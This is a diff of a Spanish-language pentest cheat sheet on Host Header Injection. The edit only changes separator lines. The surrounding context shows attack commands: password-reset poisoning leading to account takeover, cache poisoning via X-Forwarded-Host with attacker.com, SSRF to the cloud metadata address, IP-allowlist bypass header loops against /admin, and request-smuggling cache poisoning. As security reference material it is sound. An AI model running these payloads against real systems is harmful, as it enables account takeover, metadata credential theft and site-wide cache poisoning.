@@ -19,7 +19,7 @@ linked:
 ---
 # Host Header Injection - Chains y Variantes
 
-***
+---
 
 ## Password Reset Poisoning Chain
 
@@ -56,7 +56,7 @@ curl https://target.com/reset?token=eyJ... -d "password=ATTACKER_PASS"
 # 6. ATO complete — login con ATTACKER_PASS
 ```
 
-___
+---
 
 ## Cache Poisoning Combo
 
@@ -71,7 +71,7 @@ ___
 | `curl -sI -H "X-Forwarded-Host: attacker.com" https://target/feed.rss` | RSS feed self-link poison | Feed reader rerouting. |
 ^hhi-chain-cache
 
-___
+---
 
 ## Internal SSRF via Virtual Host Routing
 
@@ -87,7 +87,7 @@ ___
 | `curl -H "Host: 169.254.169.254" https://target.com/latest/meta-data/` | Cloud metadata routing | If routed by Host. |
 ^hhi-chain-ssrf
 
-___
+---
 
 ## Authentication / IP Allowlist Bypass
 
@@ -102,7 +102,7 @@ ___
 | `for h in 'X-Forwarded-For' 'X-Real-IP' 'True-Client-IP' 'Cf-Connecting-IP' 'Cluster-Client-IP' 'X-Originating-IP'; do curl -sI -H "$h: 127.0.0.1" https://target.com/admin \| head -1; done` | Bulk IP-spoof header probe | Discovery. |
 ^hhi-chain-auth
 
-___
+---
 
 ## HTTP Request Smuggling Combo
 
@@ -115,4 +115,4 @@ ___
 | Smuggle cache poison: `GET / ...` con XFH attacker en smuggled → cached | Mass cache poison | Critical chain. |
 ^hhi-chain-hrs
 
-***
+---
